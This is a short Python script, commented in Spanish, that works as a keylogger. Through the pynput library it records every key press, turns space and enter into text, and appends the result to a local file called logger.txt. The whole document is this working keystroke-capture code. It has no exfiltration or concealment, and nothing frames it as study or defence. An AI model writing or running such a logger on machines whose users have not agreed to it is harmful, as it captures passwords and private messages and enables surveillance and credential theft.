from pynput.keyboard import Listener

#  Funcion para registar teclas marcadas en teclado
def writeFile(key):
    keyData=str(key)
    keyData= keyData.replace("'", "")  # elimina el '

    #Algunas letras especiales
    if keyData =='Key.space':
        keyData=' '
    if  keyData=='Key.shift_r':
        keyData=''
    if  keyData=='Key.enter':
        keyData='\n'
        
    with open('logger.txt','a') as f:
        f.write(keyData)

with Listener(on_press=writeFile) as l:  #Al presionar una tecla se llama a la funcion writeFile
    l.join()
    